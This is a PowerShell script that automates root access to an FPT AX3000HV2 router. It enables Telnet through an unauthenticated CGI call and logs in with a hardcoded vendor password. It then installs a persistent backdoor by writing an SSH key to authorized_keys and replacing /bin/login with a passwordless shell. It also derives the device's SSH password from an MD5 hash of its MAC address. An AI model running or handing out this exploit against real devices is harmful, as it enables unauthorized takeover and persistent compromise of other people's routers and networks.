# Check if running on Windows
if ($IsLinux -or $IsMacOS -or ($env:OS -notlike "*Windows*")) 
{
    Write-Host "[-] ERROR: This script uses Windows-specific .NET Sockets." -ForegroundColor Red
    Write-Host "[!] Please use the Bash version for Linux/macOS." -ForegroundColor Yellow
    exit
}

# Check for PowerShell 3.0+ (Required for Invoke-WebRequest)
if ($PSVersionTable.PSVersion.Major -lt 3) 
{
    Write-Host "[-] ERROR: PowerShell 3.0 or higher is required." -ForegroundColor Red
    Write-Host "[!] Please update Windows Management Framework." -ForegroundColor Yellow
    exit
}

# Force TLS 1.2 for Invoke-WebRequest (Fixes connection issues on older Windows)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Configuration
$MODEM_IP = "192.168.1.1"
$TELNET_USER = "admin"
$TELNET_PASS = "hbmt@_fpt"

Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
Write-Host "   FPT AX3000HV2 Auto root SSH Script                   " -ForegroundColor Cyan
Write-Host "--------------------------------------------------------" -ForegroundColor Cyan

# Trigger Telnet via CGI
Write-Host "[*] Enabling Telnet via CGI..."
try 
{
    Invoke-WebRequest -Uri "http://$MODEM_IP/cgi-bin/telnetenable.cgi?telnetenable=1" -TimeoutSec 5 -UseBasicParsing | Out-Null
} catch 
{
    Write-Host "[-] Failed to trigger CGI. Check connection to $MODEM_IP" -ForegroundColor Red
}

# Automated Telnet Interaction using .NET Sockets 
Write-Host "[*] Accessing Telnet to extract MAC and inject keys..."

$socket = New-Object System.Net.Sockets.TcpClient($MODEM_IP, 23)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

function Send-Command($cmd) 
{
    $writer.WriteLine($cmd)
    $writer.Flush()
    Start-Sleep -Seconds 2
}

# Wait for login prompt then send credentials
Start-Sleep -Seconds 3
Send-Command $TELNET_USER
Send-Command $TELNET_PASS

# Execute commands and capture output
Send-Command "ifconfig eth0"
# SSH Key injection (Note: You would need to paste your actual public key in the string below)
$PUB_KEY = "ssh-ed25519 AAAAC3Nza..." 
Send-Command "mkdir -p /etc/dropbear"
Send-Command "echo '$PUB_KEY' > /etc/dropbear/authorized_keys"
Send-Command "rm /bin/login"
Send-Command "printf '#!/bin/sh`nexec /bin/sh -l`n' > /bin/login"
Send-Command "chmod +x /bin/login"
Send-Command "/etc/init.d/dropbear enable"
Send-Command "/etc/init.d/dropbear restart"

# Read buffer to find MAC
Start-Sleep -Seconds 2
$buffer = New-Object System.Byte[] $socket.ReceiveBufferSize
$bytesRead = $stream.Read($buffer, 0, $socket.ReceiveBufferSize)
$output = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

$socket.Close()

# Extract MAC and Calculate Password
$macMatch = [regex]::Match($output, "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")

if ($macMatch.Success) 
{
    $MAC = $macMatch.Value.ToUpper()
    Write-Host "[+] Extracted MAC: $MAC" -ForegroundColor Green
    
    # MD5 Hash calculation
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $hashBytes = $md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MAC))
    $MD5_HEX = ($hashBytes | ForEach-Object { $_.ToString("X2") }) -join ""
    
    $HEX_MID = $MD5_HEX.Substring(8, 16).ToLower()
    
    # Password Munging Logic
    $P0 = [Convert]::ToInt32($HEX_MID[0].ToString(), 16)
    $P1 = [Convert]::ToInt32($HEX_MID[1].ToString(), 16)
    $P2 = [Convert]::ToInt32($HEX_MID[2].ToString(), 16)
    
    $PassArray = $HEX_MID.ToCharArray()
    $PassArray[$P0] = '*'
    $PassArray[$P1] = '_'
    $PassArray[$P2] = '@'
    $FINAL_PASS = -join $PassArray
    
    Write-Host "[!] Predicted SSH Password: $FINAL_PASS" -ForegroundColor Yellow
} 
else 
{
    Write-Host "[-] Could not retrieve MAC address from output." -ForegroundColor Red
}

Write-Host "[*] Finished attack" -ForegroundColor Green